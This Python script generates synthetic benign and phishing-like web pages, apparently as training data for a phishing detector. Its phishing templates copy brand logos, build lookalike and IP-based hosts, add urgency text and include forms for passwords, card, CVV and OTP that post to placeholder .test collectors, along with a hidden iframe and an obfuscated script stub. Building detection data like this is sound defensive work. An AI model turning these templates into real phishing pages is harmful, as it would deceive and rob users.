"""Generate a SAFE synthetic dataset of benign and phishing-like pages.

Why synthetic: we must never fetch live phishing pages. These pages are written from
templates, contain no working scripts or real collection endpoints (all form targets
use the reserved .test TLD), and are only meant to get the pipeline running.

IMPORTANT: replace/extend this with the instructor-approved archived dataset for the
final evaluation (see docs/dataset.md). Metrics on synthetic data are optimistic.

Usage:  python scripts/generate_synthetic.py --n 300 --out fixtures/synthetic
"""
from __future__ import annotations

import argparse
import csv
import random
from pathlib import Path

BRANDS = [("PayPal", "paypal.com"), ("Microsoft", "microsoft.com"), ("Netflix", "netflix.com"),
          ("Amazon", "amazon.com"), ("HBL", "hbl.com"), ("Meezan", "meezanbank.com"), ("DHL", "dhl.com"),
          ("Apple", "apple.com"), ("Google", "google.com"), ("JazzCash", "jazzcash.com.pk")]
BENIGN_SITES = ["news.example.com", "blog.example.org", "shop.example.net", "docs.example.com",
                "university.example.edu", "recipes.example.com", "travel.example.org", "forum.example.net"]
TOPICS = ["cooking", "travel tips", "football scores", "laptop reviews", "study notes", "weather update",
          "local events", "photography", "gardening", "open source release notes"]
URGENCY = ["Your account has been suspended", "Unusual activity detected", "Action required within 24 hours",
           "Verify your account immediately", "Your account will be closed", "Unauthorized login attempt"]
BAD_TLDS = ["tk", "xyz", "top", "ml", "click"]
LOREM = ("lorem ipsum dolor sit amet consectetur adipiscing elit sed do eiusmod tempor incididunt ut "
         "labore et dolore magna aliqua ut enim ad minim veniam quis nostrud exercitation").split()


def para(rng: random.Random, n: int) -> str:
    return " ".join(rng.choice(LOREM) for _ in range(n)).capitalize() + "."


def benign_page(rng: random.Random) -> tuple[str, str]:
    kind = rng.random()
    if kind < 0.25:
        # A legitimate login page hosted on the brand's own domain (hard negative).
        brand, domain = rng.choice(BRANDS)
        url = f"https://www.{domain}/signin"
        body = f"""<header><img src="/static/logo.png" alt="{brand} logo"></header>
<h1>Sign in to {brand}</h1>
<form action="/session" method="post">
  <input type="email" name="email"><input type="password" name="password">
  <button>Sign in</button>
</form>
<p><a href="/help">Help</a> <a href="/privacy">Privacy</a> <a href="/terms">Terms</a></p>
<p>{para(rng, 30)}</p>"""
        title = f"Sign in - {brand}"
        icon = "/favicon.ico"
    else:
        site = rng.choice(BENIGN_SITES)
        topic = rng.choice(TOPICS)
        url = f"https://{site}/{topic.replace(' ', '-')}/{rng.randint(1, 999)}"
        links = "".join(f'<li><a href="/{rng.choice(LOREM)}/{i}">{rng.choice(LOREM)}</a></li>' for i in range(rng.randint(5, 25)))
        ext = "".join(f'<a href="https://ref{i}.example.org/">source {i}</a> ' for i in range(rng.randint(0, 4)))
        maybe_search = '<form action="/search" method="get"><input name="q"><button>Search</button></form>' if rng.random() < 0.5 else ""
        maybe_brand = f"<p>Shared on {rng.choice(BRANDS)[0]}.</p>" if rng.random() < 0.2 else ""
        maybe_iframe = '<iframe src="https://video.example.com/embed/1" width="560" height="315"></iframe>' if rng.random() < 0.2 else ""
        body = f"""<nav><ul>{links}</ul></nav>
<article><h1>{topic.title()}</h1>{''.join(f'<p>{para(rng, rng.randint(40, 120))}</p>' for _ in range(rng.randint(2, 6)))}</article>
{maybe_search}{maybe_iframe}{maybe_brand}<footer>{ext}</footer>"""
        title = f"{topic.title()} | {site}"
        icon = "/favicon.ico"
    scheme_note = "" if rng.random() < 0.9 else "<!-- legacy http mirror -->"
    if scheme_note:
        url = url.replace("https://", "http://")
    return url, f"""<!DOCTYPE html><html><head><meta charset="utf-8"><title>{title}</title>
<link rel="icon" href="{icon}"></head><body>{body}{scheme_note}</body></html>"""


def phishing_page(rng: random.Random) -> tuple[str, str]:
    brand, real_domain = rng.choice(BRANDS)
    b = brand.lower()
    style = rng.random()
    if style < 0.25:
        host = f"{rng.randint(11, 223)}.{rng.randint(0, 255)}.{rng.randint(0, 255)}.{rng.randint(1, 254)}"
    elif style < 0.55:
        host = f"{b}-secure-{rng.choice(['login', 'verify', 'update'])}.{rng.choice(BAD_TLDS)}"
    elif style < 0.8:
        host = f"{b}.com.account-{rng.choice(['check', 'review', 'support'])}.{rng.choice(['info', 'online', 'site'])}"
    else:
        # Subtle variant: ordinary-looking domain, fewer indicators (hard positive).
        host = f"{rng.choice(['portal', 'members', 'my'])}-{rng.choice(LOREM)}.com"
    scheme = "https" if rng.random() < 0.45 else "http"
    url = f"{scheme}://{host}/{rng.choice(['signin', 'verify', 'webscr', 'account/update', 'login.php'])}"
    if rng.random() < 0.1:
        url = f"{scheme}://{real_domain}@{host}/login"

    collector = f"https://collect{rng.randint(1, 99)}.kit.test/post.php" if rng.random() < 0.75 else "#"
    urgency = rng.choice(URGENCY) if rng.random() < 0.8 else "Please sign in to continue"
    hidden_iframe = '<iframe src="https://track.kit.test/p" width="0" height="0" style="display:none"></iframe>' if rng.random() < 0.3 else ""
    obf = ('<script>var p="dmVyaWZ5";eval(atob(p)); document.write(unescape("%3Cb%3E"));</script>'
           if rng.random() < 0.3 else "")
    logo = f'<img src="https://www.{real_domain}/images/logo.png" alt="{brand} logo">' if rng.random() < 0.6 else f'<h2>{brand}</h2>'
    icon = f"https://www.{real_domain}/favicon.ico" if rng.random() < 0.5 else "/favicon.ico"
    dead_links = "".join('<a href="#">' + w + '</a> ' for w in rng.sample(["Help", "Privacy", "Legal", "Contact", "Terms"], 3))
    extra_field = rng.choice(['<input name="card" placeholder="Card number"><input name="cvv" placeholder="CVV">',
                              '<input name="otp" placeholder="OTP">', ""])
    refresh = '<meta http-equiv="refresh" content="300;url=/">' if rng.random() < 0.15 else ""
    rightclick = '<body oncontextmenu="return false">' if rng.random() < 0.2 else "<body>"
    return url, f"""<!DOCTYPE html><html><head><meta charset="utf-8">{refresh}<title>{brand} - Account verification</title>
<link rel="icon" href="{icon}"></head>{rightclick}
{logo}<h1>{urgency}</h1>
<p>To protect your {brand} account, confirm your identity by entering your password below.</p>
<form action="{collector}" method="post">
  <input type="text" name="user"><input type="password" name="password">{extra_field}
  <button>Continue</button>
</form>
<p>{dead_links}</p>{hidden_iframe}{obf}
</body></html>"""


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--n", type=int, default=300, help="pages per class")
    ap.add_argument("--out", default="fixtures/synthetic")
    ap.add_argument("--seed", type=int, default=7)
    args = ap.parse_args()

    rng = random.Random(args.seed)
    out = Path(args.out)
    out.mkdir(parents=True, exist_ok=True)
    rows = []
    for label, maker in (("benign", benign_page), ("phishing", phishing_page)):
        for i in range(args.n):
            url, html = maker(rng)
            name = f"{label}_{i:04d}.html"
            (out / name).write_text(html, encoding="utf-8")
            rows.append({"filename": name, "label": label, "source_url": url})
    with (out / "labels.csv").open("w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=["filename", "label", "source_url"])
        w.writeheader()
        w.writerows(rows)
    print(f"wrote {len(rows)} pages + labels.csv to {out}")


if __name__ == "__main__":
    main()
